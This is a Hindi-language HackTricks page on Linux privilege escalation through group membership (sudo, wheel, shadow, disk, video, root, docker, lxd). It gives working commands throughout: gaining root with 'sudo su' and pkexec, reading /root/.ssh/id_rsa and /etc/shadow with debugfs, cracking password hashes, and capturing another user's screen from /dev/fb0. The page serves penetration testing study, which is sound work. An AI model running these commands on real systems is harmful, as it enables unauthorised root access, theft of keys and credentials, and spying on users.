<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS परिवार**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


# सुडो/एडमिन समूह

## **PE - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से \(या कुछ सॉफ़्टवेयर की आवश्यकता होने के कारण\)** **/etc/sudoers** फ़ाइल में आपको इनमें से कुछ लाइनें मिल सकती हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **सूडो या एडमिन समूह में शामिल होने वाले कोई भी उपयोगकर्ता सूडो के रूप में कुछ भी चला सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ यह चला सकते हैं**:
```text
sudo su
```
## PE - तकनीक 2

सभी suid बाइनरी ढूंढ़ें और देखें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आपको पता चलता है कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin समूह में शामिल हैं, तो आप pkexec का उपयोग करके बाइनरी को sudo के रूप में चला सकते हैं।
निम्नलिखित की सामग्री की जांच करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आपको पता चलेगा कि कौन से समूह **pkexec** और **डिफ़ॉल्ट रूप से** कुछ लिनक्स में **sudo या admin** जैसे समूहों को **चलाने की अनुमति** होती है।

**रूट बनने के लिए आप निम्नलिखित को चला सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को निष्पादित करने का प्रयास करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए कि आप GUI के बिना कनेक्ट नहीं हैं**। और इस मुद्दे का एक काम करने का तरीका यहां है: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्र** की आवश्यकता होगी:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# व्हील समूह

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल में आप इस लाइन को पाएंगे:
```text
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **व्हील समूह में शामिल होने वाले कोई भी उपयोगकर्ता sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ निष्पादित कर सकते हैं**:
```text
sudo su
```
# शैडो ग्रुप

**शैडो ग्रुप** के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़ सकते हैं**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
तो, फ़ाइल को पढ़ें और कुछ हैश को **क्रैक करने** का प्रयास करें।

# डिस्क समूह

यह विशेषाधिकार प्रायः **रूट एक्सेस के समान** होता है क्योंकि आप मशीन के अंदर के सभी डेटा तक पहुंच सकते हैं।

फ़ाइलें: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फ़ाइलें लिख सकते हैं**। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप निम्नलिखित कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
यदि आप **रूट के स्वामित्व में लिखें** \(जैसे `/etc/shadow` या `/etc/passwd`\) तो आपको "**अनुमति निषेध**" त्रुटि मिलेगी।

# वीडियो समूह

`w` कमांड का उपयोग करके आप **सिस्टम पर कौन लॉग इन है** यह पता लगा सकते हैं और यह निम्नलिखित प्रकार का आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** यह दर्शाता है कि मशीन पर उपयोगकर्ता **yossi शारीरिक रूप से लॉग इन** हैं।

**video समूह** को स्क्रीन आउटपुट देखने की अनुमति होती है। मूल रूप से, आप स्क्रीन पर वर्तमान छवि को **रॉ डेटा में पकड़ सकते** हैं और स्क्रीन द्वारा उपयोग की जा रही रिज़ॉल्यूशन प्राप्त कर सकते हैं। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन की रिज़ॉल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर ढूंढ सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**खोलने** के लिए **रॉ इमेज** का उपयोग करने के लिए आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **रॉ इमेज डेटा** का चयन करें:

![](../../.gitbook/assets/image%20%28208%29.png)

फिर चौड़ाई और ऊचाई को स्क्रीन पर उपयोग किए जाने वाले वाल्यू में संशोधित करें और विभिन्न इमेज प्रकारों की जांच करें \(और उसे चुनें जो स्क्रीन को बेहतर दिखाता है\):

![](../../.gitbook/assets/image%20%28295%29.png)

# रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलें या कुछ **लाइब्रेरी** फ़ाइलें या **अन्य रोचक चीजें** को संशोधित करने की अनुमति हो सकती है, जो विशेषाधिकारों को बढ़ाने के लिए उपयोग किया जा सकता है...

**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# डॉकर समूह

आप मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है तो वह तत्काल उस वॉल्यूम में एक `chroot` लोड करता है। इससे आपको मशीन पर रूट दिया जाता है।

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd समूह

[lxc - विशेषाधिकार उन्नयन](lxd-privilege-escalation.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
